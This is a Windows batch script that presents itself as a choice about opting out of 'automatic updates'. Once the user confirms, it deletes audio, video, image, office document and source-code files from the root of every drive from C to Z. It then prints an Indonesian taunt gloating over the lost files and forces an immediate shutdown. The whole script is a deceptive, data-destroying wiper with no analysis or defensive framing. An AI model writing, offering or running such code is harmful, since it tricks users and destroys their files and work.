@echo off
color 0A
setlocal

set "fileTypes=*.mp3 *.wav *.jpg *.png *.jpeg *.aac *.flac *.ogg *.wma *.m4a *.aiff *.midi *.amr *.opus *.mp4 *.avi *.mkv *.mov *.wmv *.flv *.m4v *.webm *.mpg *.mpeg *.3gp *.vob *.rmvb"
set "fileTypes=%fileTypes% *.pdf *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.txt *.rtf *.odt *.ods *.odp *.wpd *.html *.htm *.csv"
set "fileTypes=%fileTypes% *.py *.java *.js *.c *.cpp *.cs *.rb *.php *.swift *.go *.kt *.r *.css *.ts *.sh *.pl *.m *.hs *.lua *.asm *.scala *.ex *.exs *.dart"

echo Do you want to out of these automatic updates?:
echo %fileTypes%
set /p confirm="Press Y for Yes and N for No! (y/n): "

if /i "%confirm%" NEQ "y" (
    echo Good Bye. 
    exit /b
)

for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo Wait a minute %%d:\
        for %%f in (%fileTypes%) do (
            del "%%d:\%%f" /q
        )
    )
)

echo Kamu tolol kayak kominfo file kamu hilang aku pun senang.
shutdown /s /t 0
endlocal
